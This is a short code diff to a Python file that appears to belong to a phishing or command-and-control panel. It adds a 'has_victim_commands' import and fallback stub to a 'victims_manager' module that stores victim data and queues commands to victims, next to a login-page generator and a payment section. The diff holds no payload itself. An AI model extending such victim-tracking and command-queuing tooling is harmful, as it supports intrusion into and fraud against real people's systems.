@@ -94,7 +94,7 @@ except Exception as e:
     def sh_generate_login_page(*a, **kw): return "Error"
 
 # ============================================================
-# Victims Manager
+# ★★★ Victims Manager ★★★
 # ============================================================
 try:
     from victims_manager import (
@@ -104,6 +104,7 @@ try:
         add_victim_data, get_victim_data,
         queue_victim_command, pop_victim_commands,
         get_victim_stats,
+        has_victim_commands,  # ★ جديد
     )
     VICTIMS_ENABLED = True
     print("[+] victims_manager imported")
@@ -125,6 +126,7 @@ except Exception as e:
     def queue_victim_command(*a, **kw): return False
     def pop_victim_commands(*a, **kw): return []
     def get_victim_stats(*a, **kw): return {}
+    def has_victim_commands(*a, **kw): return False  # ★ جديد
 
 # ============================================================
 # Stars Payment
